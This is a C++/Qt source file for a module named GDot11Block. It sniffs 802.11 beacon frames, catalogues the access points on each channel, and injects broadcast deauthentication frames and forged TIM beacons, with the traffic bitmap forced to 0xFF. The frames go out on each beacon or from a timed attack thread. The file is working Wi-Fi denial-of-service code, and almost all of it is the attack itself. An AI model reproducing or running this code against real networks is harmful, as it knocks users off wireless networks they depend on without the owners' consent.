#include "gdot11block.h"

// ----------------------------------------------------------------------------
// GDot11Block
// ----------------------------------------------------------------------------
GDot11Block::GDot11Block(QObject* parent) : GStateObj(parent) {
}

GDot11Block::~GDot11Block() {
	close();
}

bool GDot11Block::doOpen() {
	if (!enabled_) return true;

	if (writer_ == nullptr) {
		SET_ERR(GErr::ObjectIsNull, "writer must be specified");
		return false;
	}

	apMap_.clear();

	if (attackInterval_ != 0) {
		attackThread_.start();
		deleteThread_.start();
	}

	return true;
}

bool GDot11Block::doClose() {
	if (!enabled_) return true;

	if (attackInterval_ != 0) {
		attackThread_.we_.wakeAll();
		attackThread_.quit();
		attackThread_.wait();

		deleteThread_.we_.wakeAll();
		deleteThread_.quit();
		deleteThread_.wait();
	}

	return true;
}

void GDot11Block::processBeacon(GPacket* packet) {
	GBeaconHdr* beaconHdr = packet->beaconHdr_;
	Q_ASSERT(beaconHdr != nullptr);

	QMutexLocker ml(&apMap_.m_);
	ApMap::iterator it = apMap_.find(currentChannel_);
	if (it == apMap_.end()) {
		Aps aps;
		it = apMap_.insert(currentChannel_, aps);
	}
	Q_ASSERT(it != apMap_.end());
	Aps& aps = it.value();

	GMac mac = beaconHdr->bssid();
	Aps::iterator apsIt = aps.find(mac);
	if (apsIt == aps.end()) {
		Ap ap;
		ap.channel_ = currentChannel_;
		ap.mac_ = mac;
		ap.deauthFrame_.radioHdr_.init();
		ap.deauthFrame_.deauthHdr_.init(beaconHdr->ta());

		QByteArray timFrame = extractBeaconTimFrame(packet);
		if (!timFrame.isEmpty()) {
			ap.timFrame_ = timFrame;
		}
		apsIt = aps.insert(mac, ap);

		if (debugLog_) {
			QString ssid;
			int channel = 0;

			GBeaconHdr::Tag* tag = beaconHdr->firstTag();
			void* end = packet->buf_.data_ + packet->buf_.size_;
			while(tag < end) {
				le8_t num = tag->num_;
				switch (num) {
					case GBeaconHdr::TagSsidParameterSet:
						ssid = QByteArray(pchar(tag->value()), tag->len_);
						break;
					case GBeaconHdr::TagDsParameterSet: {
						char* p = pchar(tag->value());
						channel = *p;
						break;
					}
				}
				if (ssid != "" && channel != 0)
					break;
				tag = tag->next();
				if (tag == nullptr) break;
			}
			if (ssid != "")
				qDebug() << ssid << channel;
			emit blocked(packet);
		}
	}
	if (attackOnPacket_) {
		Ap& ap = apsIt.value();
		attack(ap);
	}
}

void GDot11Block::attack(Ap& ap) {
	if (deauthApBroadcast_) {
		GBuf buf(pbyte(&ap.deauthFrame_), sizeof(ap.deauthFrame_));
            writer_->write(buf);
	}
	if (timAttack_) {
		if (!ap.timFrame_.isEmpty()) {
			GBuf buf(pbyte(ap.timFrame_.data()), ap.timFrame_.size());
			writer_->write(buf);
		}
	}
}

QByteArray GDot11Block::extractBeaconTimFrame(GPacket *packet) {
	GRadioHdr* radioHdr = packet->radioHdr_;
	Q_ASSERT(radioHdr != nullptr);

	GBeaconHdr* beaconHdr = packet->beaconHdr_;
	Q_ASSERT(beaconHdr != nullptr);

	size_t beaconSize = packet->buf_.size_ - radioHdr->len_;

	uint32_t fcsSize = 0;
	QList<GBuf> bufList = radioHdr->getPresentFlags(GRadioHdr::Flags);
	for (GBuf& buf: bufList) {
		uint8_t flag = buf.data_[0];
		if (flag & GRadioHdr::fcsAtEnd) {
			fcsSize += sizeof(uint32_t);
			if (fcsSize > sizeof(uint32_t))
				qWarning() << "fcsSize=" << fcsSize;
		}
	}
	qDebug() << QString("beaconSize=%1 fcsSize=%2").arg(beaconSize).arg(fcsSize);
	beaconSize -= fcsSize;

	if (beaconSize > BUFSIZ - sizeof(GRadioHdr)) {
		qWarning() << QString("too big packet size(%1)").arg(packet->buf_.size_);
		return QByteArray();
	} else {
		char buffer[BUFSIZ];
		GRadioHdr* timRadioHdr = PRadioHdr(buffer);
		timRadioHdr->init();
		GBeaconHdr* timBeaconHdr = PBeaconHdr(buffer + sizeof(GRadioHdr));
		memcpy(pvoid(timBeaconHdr), pvoid(beaconHdr), beaconSize);

		GBeaconHdr::TrafficIndicationMap* tim = GBeaconHdr::PTrafficIndicationMap(timBeaconHdr->findFirstTag(GBeaconHdr::TagTrafficIndicationMap, packet->buf_.size_));
		if (tim == nullptr) {
			qWarning() << "can not find TrafficIndicationMap";
			return QByteArray();
		}
		tim->control_ = 1;
		tim->bitmap_ = 0xFF;
		return QByteArray(buffer, sizeof(GRadioHdr) + beaconSize);
	}
}
void GDot11Block::attackRun() {
	qDebug() << "beg"; // gilgil temp 2022.02.01

	while (active()) {
		if (attackThread_.we_.wait(attackInterval_)) break;
		{
			QMutexLocker ml(&apMap_.m_);
			ApMap::iterator it = apMap_.find(currentChannel_);
			if (it == apMap_.end()) continue;
			Aps& aps = it.value();

			for (Ap& ap: aps) {
				attack(ap);
				if (attackThread_.we_.wait(sendInterval_)) break;
			}
		}
	}

	qDebug() << "end"; // gilgil temp 2022.02.01
}

void GDot11Block::deleteRun() {
	qDebug() << "beg"; // gilgil temp 2022.02.01

	while (active()) {
		deleteThread_.we_.wait(attackInterval_);
	}

	qDebug() << "end"; // gilgil temp 2022.02.01
}

void GDot11Block::block(GPacket* packet) {
	if (!enabled_) return;

	GBeaconHdr* beaconHdr = packet->beaconHdr_;
	if (beaconHdr != nullptr)
		processBeacon(packet);
}

void GDot11Block::processChannelChanged(int channel) {
	qDebug() << channel;
	currentChannel_ = channel;
}
